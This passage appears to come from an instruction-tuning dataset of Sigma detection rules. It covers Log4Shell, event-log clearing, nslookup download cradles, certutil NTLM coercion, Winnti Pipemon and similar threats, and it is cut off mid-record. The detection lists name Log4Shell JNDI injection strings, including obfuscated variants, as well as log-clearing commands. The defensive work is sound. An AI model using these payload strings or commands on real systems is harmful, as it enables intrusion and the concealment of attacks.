      "answer": "In order to detect exploitation of Nimbuspwn privilege escalation vulnerability (CVE-2022-29799 and CVE-2022-29800), you should: Monitor Linux system logs for specific indicators that signal an attack attempt related to these vulnerabilities. Look for log entries that contain any of the following keywords: 'networkd-dispatcher', 'Error handling notification for interface', or '../../'. These keywords suggest exploitation attempts that take advantage of the Nimbuspwn vulnerability, such as abnormal error handling notifications or the use of directory traversal patterns. It's important to treat any log entries matching these patterns with a high level of suspicion, as there are not known false positives that are common with these indicators in the context of a Linux environment. This detection focuses on key activities associated with privilege escalation attempts, leveraging the vulnerabilities in question."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when PIM alerts are set to disabled..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when PIM (Privileged Identity Management) alerts are set to disabled, you should: Focus on monitoring the audit logs within Azure services. Specifically, look for instances where the message indicates a \"Disable PIM Alert\" action has occurred. This detection is crucial because it might signal an attacker's attempt to weaken security by turning off alerts for privileged account changes, which should otherwise be closely monitored. However, it's important to remember that there might be legitimate reasons for an administrator to disable these alerts, such as during a controlled maintenance period. Due to the potential severity of an attacker successfully disabling PIM alerts to conceal their activities, such events are classified with a high level of concern.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Disable PIM Alert\n    condition: selection\nfalsepositives:\n    - Administrator disabling PIM alerts as an active choice.\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: auditlogs\ndetection:\n    selection:\n        properties.message: Disable PIM Alert\n    condition: selection\nfalsepositives:\n    - Administrator disabling PIM alerts as an active choice.\nlevel: high\n",
      "question": "when PIM alerts are set to disabled.",
      "answer": "In order to detect when PIM (Privileged Identity Management) alerts are set to disabled, you should: Focus on monitoring the audit logs within Azure services. Specifically, look for instances where the message indicates a \"Disable PIM Alert\" action has occurred. This detection is crucial because it might signal an attacker's attempt to weaken security by turning off alerts for privileged account changes, which should otherwise be closely monitored. However, it's important to remember that there might be legitimate reasons for an administrator to disable these alerts, such as during a controlled maintenance period. Due to the potential severity of an attacker successfully disabling PIM alerts to conceal their activities, such events are classified with a high level of concern."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros, you should focus on monitoring changes within the Windows registry specifically targeting registry set actions. Look for events where the EventType is marked as \"SetValue\" which indicates a modification attempt. Narrow this monitoring further by specifically targeting registry keys that contain the following path segments: '\\SOFTWARE\\', '\\Microsoft\\Office\\', and '\\Common\\Security'. Additionally, ensure that these registry changes conclude with the '\\MacroRuntimeScanScope' to accurately pinpoint attempts at disabling macro scanning. Pay particular attention to modifications where the Details are set to a DWORD value of 0x00000000, as this indicates the disarming of macro runtime scans.\n\nIt's essential to have this monitoring in place despite the potential for unknown false positives, given this activity's high threat level. This approach aligns with identifying tactics and techniques such as defense evasion and execution through the manipulation of security-critical registry keys to bypass the runtime scanning of macros. This ensures a robust defense mechanism is in place to detect attempts at undermining security features designed to prevent the execution of potentially malicious macros.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains|all:\n            - '\\SOFTWARE\\'\n            - '\\Microsoft\\Office\\'\n            - '\\Common\\Security'\n        TargetObject|endswith: '\\MacroRuntimeScanScope'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains|all:\n            - '\\SOFTWARE\\'\n            - '\\Microsoft\\Office\\'\n            - '\\Common\\Security'\n        TargetObject|endswith: '\\MacroRuntimeScanScope'\n        Details: DWORD (0x00000000)\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros",
      "answer": "In order to detect tampering with the MacroRuntimeScanScope registry key to disable runtime scanning of enabled macros, you should focus on monitoring changes within the Windows registry specifically targeting registry set actions. Look for events where the EventType is marked as \"SetValue\" which indicates a modification attempt. Narrow this monitoring further by specifically targeting registry keys that contain the following path segments: '\\SOFTWARE\\', '\\Microsoft\\Office\\', and '\\Common\\Security'. Additionally, ensure that these registry changes conclude with the '\\MacroRuntimeScanScope' to accurately pinpoint attempts at disabling macro scanning. Pay particular attention to modifications where the Details are set to a DWORD value of 0x00000000, as this indicates the disarming of macro runtime scans.\n\nIt's essential to have this monitoring in place despite the potential for unknown false positives, given this activity's high threat level. This approach aligns with identifying tactics and techniques such as defense evasion and execution through the manipulation of security-critical registry keys to bypass the runtime scanning of macros. This ensures a robust defense mechanism is in place to detect attempts at undermining security features designed to prevent the execution of potentially malicious macros."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious powershell download cradle using nslookup. This cradle uses nslookup to extract payloads from DNS records.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious PowerShell download cradle using nslookup, which utilizes nslookup to extract payloads from DNS records, you should: Focus on monitoring process creations in Windows environments. Specifically, watch for instances where `nslookup.exe` is the process image launched, either by directly matching the image name to `\\nslookup.exe` or by verifying the original filename as `\\nslookup.exe`. Furthermore, it is essential to scrutinize any command line activities that originate from either PowerShell (`powershell.exe`) or PowerShell Core (`pwsh.exe`) where the command line includes DNS query-type indicators such as `-q=txt` or `-querytype=txt`. These particular command line parameters are suggestive of attempts to query text records from DNS, which is a tactic often employed by adversaries to extract malicious payloads covertly. Report any matching observations as they could be indicative of an ongoing attack. Be aware that this detection might have unknown false positives, signifying the need for manual verification of alerts to confirm malicious activity. The severity level associated with this monitoring strategy is deemed medium, reflecting the potential risk posed by the detected behavior in aligning with tactics such as Command and Control or Initial Access through the use of PowerShell for downloading malicious payloads via DNS records.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\nslookup.exe'\n        - OriginalFileName: '\\nslookup.exe'\n    selection_cmd:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -q=txt '\n            - ' -querytype=txt '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|contains: '\\nslookup.exe'\n        - OriginalFileName: '\\nslookup.exe'\n    selection_cmd:\n        ParentImage|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - ' -q=txt '\n            - ' -querytype=txt '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious powershell download cradle using nslookup. This cradle uses nslookup to extract payloads from DNS records",
      "answer": "In order to detect suspicious PowerShell download cradle using nslookup, which utilizes nslookup to extract payloads from DNS records, you should: Focus on monitoring process creations in Windows environments. Specifically, watch for instances where `nslookup.exe` is the process image launched, either by directly matching the image name to `\\nslookup.exe` or by verifying the original filename as `\\nslookup.exe`. Furthermore, it is essential to scrutinize any command line activities that originate from either PowerShell (`powershell.exe`) or PowerShell Core (`pwsh.exe`) where the command line includes DNS query-type indicators such as `-q=txt` or `-querytype=txt`. These particular command line parameters are suggestive of attempts to query text records from DNS, which is a tactic often employed by adversaries to extract malicious payloads covertly. Report any matching observations as they could be indicative of an ongoing attack. Be aware that this detection might have unknown false positives, signifying the need for manual verification of alerts to confirm malicious activity. The severity level associated with this monitoring strategy is deemed medium, reflecting the potential risk posed by the detected behavior in aligning with tactics such as Command and Control or Initial Access through the use of PowerShell for downloading malicious payloads via DNS records."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting possible NTLM coercion via certutil using the 'syncwithWU' flag.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect possible NTLM coercion via certutil using the 'syncwithWU' flag, you should: Monitor process creation events on Windows systems for the execution of 'certutil.exe'. Specifically, look for instances where the process image ends with '\\certutil.exe' or has 'CertUtil.exe' as the OriginalFileName. Additionally, pay attention to the command line arguments, ensuring that they contain both ' -syncwithWU ' and a double backslash ('\\\\\\\\'). These criteria must all be met in order to flag a potential NTLM coercion attempt. It is important to be cautious as there might be unknown legitimate uses of these command line arguments, however, the combination specified typically indicates a high level of threat.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -syncwithWU '\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\certutil.exe'\n        - OriginalFileName: 'CertUtil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -syncwithWU '\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "possible NTLM coercion via certutil using the 'syncwithWU' flag",
      "answer": "In order to detect possible NTLM coercion via certutil using the 'syncwithWU' flag, you should: Monitor process creation events on Windows systems for the execution of 'certutil.exe'. Specifically, look for instances where the process image ends with '\\certutil.exe' or has 'CertUtil.exe' as the OriginalFileName. Additionally, pay attention to the command line arguments, ensuring that they contain both ' -syncwithWU ' and a double backslash ('\\\\\\\\'). These criteria must all be met in order to flag a potential NTLM coercion attempt. It is important to be cautious as there might be unknown legitimate uses of these command line arguments, however, the combination specified typically indicates a high level of threat."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting clearing or configuration of eventlogs using wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect clearing or configuration of eventlogs using wevtutil, powershell and wmic, which might be used by ransomwares during an attack (as observed in instances like NotPetya and others), you should: monitor for process creation events on Windows systems where the image path ends with 'wevtutil.exe', 'powershell.exe', 'pwsh.exe', or 'wmic.exe'. Specifically, look for command line arguments that include commands to clear logs (such as 'clear-log', 'cl', 'Clear-EventLog', 'Remove-EventLog', 'Clear-WinEvent', or 'ClearEventLog'), modify log configurations ('set-log', 'sl', attempts to limit event log size or change its configuration), or change the log file's location and name ('lfn:'). Additionally, an exception should be made for legitimate administrative activities, which might involve the use of 'msiexec.exe' as a parent process when updating or installing Microsoft Office, as indicated by specific command line arguments like 'sl'. It is vital to analyze these events carefully because, while they may indicate a breach or malicious activity such as ransomware attempting to cover its tracks, they could also result from ordinary administrative or maintenance tasks. Therefore, a high level of caution should be maintained, and potential false positives such as admin activity, use of scripts and administrative tools, or maintenance activities should be considered.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wevtutil:\n        Image|endswith: '\\wevtutil.exe'\n        CommandLine|contains:\n            - 'clear-log '          # clears specified log\n            - ' cl '                # short version of 'clear-log'\n            - 'set-log '            # modifies config of specified log. could be uset to set it to a tiny size\n            - ' sl '                # short version of 'set-log'\n            - 'lfn:'                # change log file location and name\n    selection_other_ps:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'Clear-EventLog '\n            - 'Remove-EventLog '\n            - 'Limit-EventLog '\n            - 'Clear-WinEvent '\n    selection_other_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains: 'ClearEventLog'\n    filter_msiexec:\n        # Example seen during office update/installation:\n        #   ParentImage: C:\\Windows\\SysWOW64\\msiexec.exe\n        #   CommandLine: \"C:\\WINDOWS\\system32\\wevtutil.exe\" sl Microsoft-RMS-MSIPC/Debug /q:true /e:true /l:4 /rt:false\n        ParentImage:\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n        CommandLine|contains: ' sl '\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Maintenance activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_wevtutil:\n        Image|endswith: '\\wevtutil.exe'\n        CommandLine|contains:\n            - 'clear-log '          # clears specified log\n            - ' cl '                # short version of 'clear-log'\n            - 'set-log '            # modifies config of specified log. could be uset to set it to a tiny size\n            - ' sl '                # short version of 'set-log'\n            - 'lfn:'                # change log file location and name\n    selection_other_ps:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'Clear-EventLog '\n            - 'Remove-EventLog '\n            - 'Limit-EventLog '\n            - 'Clear-WinEvent '\n    selection_other_wmic:\n        Image|endswith: '\\wmic.exe'\n        CommandLine|contains: 'ClearEventLog'\n    filter_msiexec:\n        # Example seen during office update/installation:\n        #   ParentImage: C:\\Windows\\SysWOW64\\msiexec.exe\n        #   CommandLine: \"C:\\WINDOWS\\system32\\wevtutil.exe\" sl Microsoft-RMS-MSIPC/Debug /q:true /e:true /l:4 /rt:false\n        ParentImage:\n            - 'C:\\Windows\\SysWOW64\\msiexec.exe'\n            - 'C:\\Windows\\System32\\msiexec.exe'\n        CommandLine|contains: ' sl '\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Maintenance activity\nlevel: high\n",
      "question": "clearing or configuration of eventlogs using wevtutil, powershell and wmic. Might be used by ransomwares during the attack (seen by NotPetya and others).",
      "answer": "In order to detect clearing or configuration of eventlogs using wevtutil, powershell and wmic, which might be used by ransomwares during an attack (as observed in instances like NotPetya and others), you should: monitor for process creation events on Windows systems where the image path ends with 'wevtutil.exe', 'powershell.exe', 'pwsh.exe', or 'wmic.exe'. Specifically, look for command line arguments that include commands to clear logs (such as 'clear-log', 'cl', 'Clear-EventLog', 'Remove-EventLog', 'Clear-WinEvent', or 'ClearEventLog'), modify log configurations ('set-log', 'sl', attempts to limit event log size or change its configuration), or change the log file's location and name ('lfn:'). Additionally, an exception should be made for legitimate administrative activities, which might involve the use of 'msiexec.exe' as a parent process when updating or installing Microsoft Office, as indicated by specific command line arguments like 'sl'. It is vital to analyze these events carefully because, while they may indicate a breach or malicious activity such as ransomware attempting to cover its tracks, they could also result from ordinary administrative or maintenance tasks. Therefore, a high level of caution should be maintained, and potential false positives such as admin activity, use of scripts and administrative tools, or maintenance activities should be considered."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed), you should focus on monitoring process creation events within Windows systems. Specifically, keep an eye out for any processes that are initialized by dns.exe, signaling possible malicious activity. It is important, however, to exclude any instances where conhost.exe is the spawned process, as this does not necessarily indicate an attack. Despite this measure, the uncertainty of false positives remains high, emphasizing the need for vigilant analysis. This approach aligns with understanding and mitigating threats against remote code execution or exploitation tactics.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dns.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\dns.exe'\n    filter:\n        Image|endswith: '\\conhost.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed)",
      "answer": "In order to detect an unexpected process spawning from dns.exe which may indicate activity related to remote code execution or other forms of exploitation as seen in CVE-2020-1350 (SigRed), you should focus on monitoring process creation events within Windows systems. Specifically, keep an eye out for any processes that are initialized by dns.exe, signaling possible malicious activity. It is important, however, to exclude any instances where conhost.exe is the spawned process, as this does not necessarily indicate an attack. Despite this measure, the uncertainty of false positives remains high, emphasizing the need for vigilant analysis. This approach aligns with understanding and mitigating threats against remote code execution or exploitation tactics."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting blocked image load events with revoked certificates by code integrity..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect blocked image load events with revoked certificates by code integrity, you should: Monitor the Windows Code Integrity operational logs for Event ID 3036. This event indicates that Windows cannot verify the integrity of a file because the signing certificate for the file has been revoked. You should check with the software publisher to see if a new, signed version of the kernel module or file is available. This detection is crucial as it points towards attempts to load software or drivers with known vulnerabilities or malicious intent, where the digital signatures have been revoked to maintain system integrity. The occurrence of such an event is considered highly suspicious and is unlikely to produce false positives, implying a high level of confidence in the significance of this alert in identifying potential security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: codeintegrity-operational\ndetection:\n    selection:\n        EventID: 3036 # Windows is unable to verify the integrity of the file %2 because the signing certificate has been revoked.  Check with the publisher to see if a new signed version of the kernel module is available.\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: codeintegrity-operational\ndetection:\n    selection:\n        EventID: 3036 # Windows is unable to verify the integrity of the file %2 because the signing certificate has been revoked.  Check with the publisher to see if a new signed version of the kernel module is available.\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "blocked image load events with revoked certificates by code integrity.",
      "answer": "In order to detect blocked image load events with revoked certificates by code integrity, you should: Monitor the Windows Code Integrity operational logs for Event ID 3036. This event indicates that Windows cannot verify the integrity of a file because the signing certificate for the file has been revoked. You should check with the software publisher to see if a new, signed version of the kernel module or file is available. This detection is crucial as it points towards attempts to load software or drivers with known vulnerabilities or malicious intent, where the digital signatures have been revoked to maintain system integrity. The occurrence of such an event is considered highly suspicious and is unlikely to produce false positives, implying a high level of confidence in the significance of this alert in identifying potential security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific process characteristics of Winnti Pipemon malware reported by ESET.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process characteristics of Winnti Pipemon malware reported by ESET, you should: focus on the creation of processes within Windows environments. The detection mechanism should look for processes that are initiated with command lines containing 'setup0.exe -p' or 'setup.exe'. Additionally, for those processes started with 'setup.exe', further scrutiny is needed if the command line ends with '-x:0', '-x:1', or '-x:2'. These specific patterns are indicative of the attack strategy employed by the Winnti Pipemon malware. It is crucial, however, to be aware that there might be legitimate software installation processes that use similar command line parameters, which could lead to false positives. The severity of this detection is considered critical due to the malicious nature of the involved software.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains: 'setup0.exe -p'\n    selection_2:\n        CommandLine|contains: 'setup.exe'\n        CommandLine|endswith:\n            - '-x:0'\n            - '-x:1'\n            - '-x:2'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate setups that use similar flags\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains: 'setup0.exe -p'\n    selection_2:\n        CommandLine|contains: 'setup.exe'\n        CommandLine|endswith:\n            - '-x:0'\n            - '-x:1'\n            - '-x:2'\n    condition: 1 of selection_*\nfalsepositives:\n    - Legitimate setups that use similar flags\nlevel: critical\n",
      "question": "specific process characteristics of Winnti Pipemon malware reported by ESET",
      "answer": "In order to detect specific process characteristics of Winnti Pipemon malware reported by ESET, you should: focus on the creation of processes within Windows environments. The detection mechanism should look for processes that are initiated with command lines containing 'setup0.exe -p' or 'setup.exe'. Additionally, for those processes started with 'setup.exe', further scrutiny is needed if the command line ends with '-x:0', '-x:1', or '-x:2'. These specific patterns are indicative of the attack strategy employed by the Winnti Pipemon malware. It is crucial, however, to be aware that there might be legitimate software installation processes that use similar command line parameters, which could lead to false positives. The severity of this detection is considered critical due to the malicious nature of the involved software."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt against log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts against the log4j RCE vulnerability reported as CVE-2021-44228 in different header fields found in web server logs (Log4Shell), you should monitor web server log entries for specific patterns that indicate an attack attempt. Focus should be on the 'User-Agent', 'URI Query', and 'Referer' header fields of web traffic. These fields are commonly abused by attackers to deliver malicious payloads exploiting the Log4Shell vulnerability. \n\nLook out for the presence of certain key patterns within these fields, which include variations of the JNDI lookup strings such as '${jndi:ldap:/', '${jndi:rmi:/', and others that involve encoded versions of these strings or manipulations aimed at evading simple detection mechanisms (e.g., '${base64:JHtqbmRp', '${${env:BARFOO:-j}', and '${${lower:j}ndi:'). Also, signs of obfuscation like strings containing encoded '${jndi:' and other crafted entries indicating attempts to leverage the Log4Shell vulnerability should be carefully examined.\n\nIt's important to adjust monitoring tools to detect these specific patterns in the 'User-Agent', 'URI Query', and 'Referer' fields to promptly identify and respond to potential exploitation attempts. However, be mindful of possible false positives, such as those that might arise from vulnerability scanning activities, and adjust the detection mechanisms accordingly. The level of threat associated with these detection patterns is considered high, underscoring the necessity of implementing these measures to secure web servers against this critical vulnerability.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-user-agent|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    # selection2:\n        # user-agent|contains:\n            # - '${jndi:ldap:/'\n            # - '${jndi:rmi:/'\n            # - '${jndi:ldaps:/'\n            # - '${jndi:dns:/'\n            # - '/$%7bjndi:'\n            # - '%24%7bjndi:'\n            # - '$%7Bjndi:'\n            # - '%2524%257Bjndi'\n            # - '%2F%252524%25257Bjndi%3A'\n            # - '${jndi:${lower:'\n            # - '${::-j}${'\n            # - '${jndi:nis'\n            # - '${jndi:nds'\n            # - '${jndi:corba'\n            # - '${jndi:iiop'\n            # - 'Reference Class Name: foo'\n            # - '${${env:BARFOO:-j}'\n            # - '${::-l}${::-d}${::-a}${::-p}'\n            # - '${base64:JHtqbmRp'\n            # - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            # - '${${lower:j}ndi:'\n            # - '${${upper:j}ndi:'\n            # - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection3:\n        cs-uri-query|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection4:\n        cs-referer|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    condition: 1 of selection*\nfalsepositives:\n    - Vulnerability scanning\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-user-agent|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    # selection2:\n        # user-agent|contains:\n            # - '${jndi:ldap:/'\n            # - '${jndi:rmi:/'\n            # - '${jndi:ldaps:/'\n            # - '${jndi:dns:/'\n            # - '/$%7bjndi:'\n            # - '%24%7bjndi:'\n            # - '$%7Bjndi:'\n            # - '%2524%257Bjndi'\n            # - '%2F%252524%25257Bjndi%3A'\n            # - '${jndi:${lower:'\n            # - '${::-j}${'\n            # - '${jndi:nis'\n            # - '${jndi:nds'\n            # - '${jndi:corba'\n            # - '${jndi:iiop'\n            # - 'Reference Class Name: foo'\n            # - '${${env:BARFOO:-j}'\n            # - '${::-l}${::-d}${::-a}${::-p}'\n            # - '${base64:JHtqbmRp'\n            # - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            # - '${${lower:j}ndi:'\n            # - '${${upper:j}ndi:'\n            # - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection3:\n        cs-uri-query|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - '${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$'\n            - '${${lower:j}ndi:'\n            - '${${upper:j}ndi:'\n            - '${${::-j}${::-n}${::-d}${::-i}:'\n    selection4:\n        cs-referer|contains:\n            - '${jndi:ldap:/'\n            - '${jndi:rmi:/'\n            - '${jndi:ldaps:/'\n            - '${jndi:dns:/'\n            - '/$%7bjndi:'\n            - '%24%7bjndi:'\n            - '$%7Bjndi:'\n            - '%2524%257Bjndi'\n            - '%2F%252524%25257Bjndi%3A'\n            - '${jndi:${lower:'\n            - '${::-j}${'\n            - '${jndi:nis'\n            - '${jndi:nds'\n            - '${jndi:corba'\n            - '${jndi:iiop'\n            - 'Reference Class Name: foo'\n            - '${${env:BARFOO:-j}'\n            - '${::-l}${::-d}${::-a}${::-p}'\n            - '${base64:JHtqbmRp'\n            - 